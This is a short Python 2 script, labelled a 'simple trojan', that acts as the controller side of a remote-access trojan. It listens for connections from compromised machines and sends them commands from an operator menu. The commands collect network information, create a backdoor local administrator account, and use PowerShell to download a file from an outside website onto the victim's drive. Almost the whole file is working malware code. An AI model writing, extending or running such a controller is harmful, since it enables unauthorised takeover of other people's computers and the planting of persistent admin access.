##
# SIMPLE TROJAN PYTHON
# @author - Jerome Themee - security analyst
# @date - 16/07/2015
##
import socket
import threading

# socket creation
bind_ip = "0.0.0.0"
bind_port = 8081

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(5)

# listening
print "############### SIMPLE TROJAN PYTHON #######################"
print "############### @author - Jerome Themee - security analyst #"
print "################### @date - 16/07/2015 #####################\n"
print "[*] Trojan ok - listening on %s:%d" % (bind_ip, bind_port)  # say hi !


def handle_client(client_socket):
    while True:
        # go to the choice list
        print "[*] What would you like to do ?\n"
        print "[*] go 1 for ipconfig"
        print "[*] go 2 for add admin"
        print "[*] go 3 for wget un fichier"
        choiseTrojan = raw_input("[waiting for your choice] 1 - 2 - 3 -> ")

        if choiseTrojan == "1":
            # send back the packet
            print "affiche ipconfig"
            response = "ipconfig"
            client_socket.sendall(response)
            # print the client data
            request = client_socket.recv(2048)
            print "[*] Received: %s\n" % request

        elif choiseTrojan == "2":
            # send back the packet
            response1 = "net user lol lool /add"
            response2 = "net localgroup administrateurs lol /add"
            client_socket.sendall(response1)
            client_socket.sendall(response2)
            # print the client data
            request = client_socket.recv(2048)
            print "[*] Received: %s\n" % request

        elif choiseTrojan == "3":
            # send back the packet
            response = "powerhsell -Command Invoke-WebRequest https://rambletech.wordpress.com/ -OutFile c:\lol.txt"
            client_socket.send(response)
            # print the client data
            request = client_socket.recv(2048)
            print "[*] Received: %s\n" % request


# loop for waiting connections
while True:
    client, addr = server.accept()
    print "[*] Accepted connection from %s:%d" % (addr[0], addr[1])
    # threading started
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()